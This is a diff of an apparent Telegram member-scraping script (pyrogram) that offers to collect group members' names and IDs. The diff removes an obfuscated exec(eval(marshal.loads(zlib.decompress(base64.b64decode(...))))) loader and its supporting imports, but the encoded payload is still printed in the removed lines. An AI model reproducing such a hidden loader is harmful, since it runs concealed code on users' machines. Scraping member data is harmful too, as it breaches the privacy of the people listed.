@@ -1,16 +1,12 @@
 from pyrogram import *
-import marshal
 from pyfiglet import figlet_format
-import json
 from colorama import init, Fore
 import urllib
 from termcolor import cprint 
 import random
 import time
 import sys
-import glob
-import zlib 
-import base64 
+
 
 init()
 n = Fore.RESET
@@ -47,8 +43,7 @@ print(wt)
 
 init(strip=not sys.stdout.isatty()) # strip colors if stdout is redirected
 
-if sys.version_info[0] > 2:
-    from urllib import request
+
 
 cprint(figlet_format('SAMY BR', font='starwars'),
        'yellow', 'on_red', attrs=['bold'])
@@ -57,11 +52,9 @@ print(f'{r}--->          {ye} Wich one !! ?{n}')
 print(f'{r}   |')
 print(f'{r}   ---> {lg}[1]{n} Create session ')
 print(f'{r}   |')
-urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
 print(f'{r}   ---> {lg}[2]{n} Get group and supergroup members name and id ')
 print(f'{r}   |')
 print(f'{r}____<3____{n}{ye}')
-exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWJgYCgtyskvSM3TUM8oKSmw0tc3MdUzNDbQszDWM7G0MjQ2ttDXLy5JTE8tKtavMIjUK6hU19QrSk1M0dAEAC6nEc0=')))))
 print(' ')
 while True:
 
